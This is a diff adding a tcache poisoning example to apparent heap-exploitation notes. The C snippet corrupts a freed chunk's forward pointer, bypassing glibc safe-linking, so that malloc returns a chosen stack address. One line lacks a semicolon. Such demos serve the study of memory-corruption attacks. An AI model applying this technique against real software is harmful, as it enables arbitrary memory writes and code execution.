@@ -410,3 +410,24 @@ new = malloc(CHUNK_FREED_SIZE + 0x10); // allocated in a new segment of heap, fr
 old = new;
 new = malloc(FREED_SIZE); // get the freed chunk from smallbins
 ```
+## tcache_poisoning
+```c
+size_t stack_var[0x10];
+size_t *target = NULL;
+
+for(int i=0; i<0x10; i++) {
+    if(((long)&stack_var[i] & 0xf) == 0) {
+        target = &stack_var[i];
+        break;
+    }
+}
+intptr_t *a = malloc(128);
+intptr_t *b = malloc(128);
+free(a);
+free(b);
+
+b[0] = (intptr_t)((long)target ^ (long)b >> 12); // b->fd = target(stack)
+malloc(128)
+intptr_t *c = malloc(128); // stack address allocated
+assert((long)target == (long)c);
+```
